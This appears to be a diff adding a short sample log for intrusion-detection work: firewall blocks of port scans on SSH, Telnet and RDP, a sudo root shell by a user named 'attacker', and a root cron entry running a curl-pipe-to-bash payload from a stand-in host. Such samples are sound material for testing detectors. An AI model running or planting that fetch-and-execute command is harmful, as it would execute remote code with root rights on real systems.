@@ -1,0 +1,5 @@
+Oct 12 13:00:01 box kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.88 DST=10.0.0.2 PROTO=TCP DPT=22
+Oct 12 13:00:02 box kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.88 DST=10.0.0.2 PROTO=TCP DPT=23
+Oct 12 13:00:03 box kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.88 DST=10.0.0.2 PROTO=TCP DPT=3389
+Oct 12 13:00:04 box sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Oct 12 13:00:05 box CRON[999]: (root) CMD (curl http://203.0.113.50/payload.sh | bash)
